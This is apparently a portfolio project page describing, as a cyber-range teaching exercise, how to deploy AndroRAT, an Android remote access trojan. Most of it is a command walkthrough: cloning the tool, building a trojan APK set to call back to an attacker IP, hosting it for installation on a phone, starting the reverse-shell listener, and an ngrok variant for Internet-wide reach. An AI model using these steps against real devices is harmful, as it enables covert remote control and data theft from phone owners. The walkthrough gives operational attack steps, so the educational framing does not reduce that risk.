---
layout: page
title: AndroRAT Deployment
permalink: /projects/androrat/
---
## 🧪 Project Overview

This project demonstrates the controlled deployment and configuration of **AndroRAT** (Android Remote Administration Tool) for **educational and research purposes** within a secured cyber range. It was designed for teaching cybersecurity students the fundamentals of Android payload delivery, command & control, and post-exploitation techniques in a **legal and ethical** environment.

---

## 🎯 Key Goals

- Understand Android reverse shell mechanics
- Configure and deploy AndroRAT in **same-network** and **Internet-facing** modes
- Operate AndroRAT's shell listener and payload builder
- Simulate attacker behavior and train detection responses

---

## ⚙️ Technologies Used

- **Python 3.12+**
- **Virtual Environment (`venv`)**
- **Linux (Kali & Ubuntu 24.04)**
- **Ngrok (for WAN connections)**
- **Android (Real Device or Emulator)**
- **VS Code, Git, Termux (optional)**

---

## 📌 Setup & Execution

### 📡 Same-Network Deployment

```bash
# 1. Clone the AndroRAT repo
git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT

# 2. Create a virtual environment
python3 -m venv venv

# 3. Activate the environment
source venv/bin/activate

# 4. Install required packages
pip install -r requirements.txt

# 5. Build the APK
python3 androRat.py --build -i <Attacker_IP> -p 8000 -o rat.apk

# 6. Host the APK using a simple HTTP server
python3 -m http.server 8080

# 7. On the Android device, download and install rat.apk

# 8. Start the AndroRAT listener
python3 androRat.py --shell -i <Attacker_IP> -p 8000

# 9. Wait for reverse shell connection ✅

# 1. Build the APK with ngrok tunnel
python3 androRat.py --build --ngrok -o rat.apk

# 2. Install APK on Android device

# 3. Start listener (Ngrok auto-handles the tunnel)
python3 androRat.py --shell
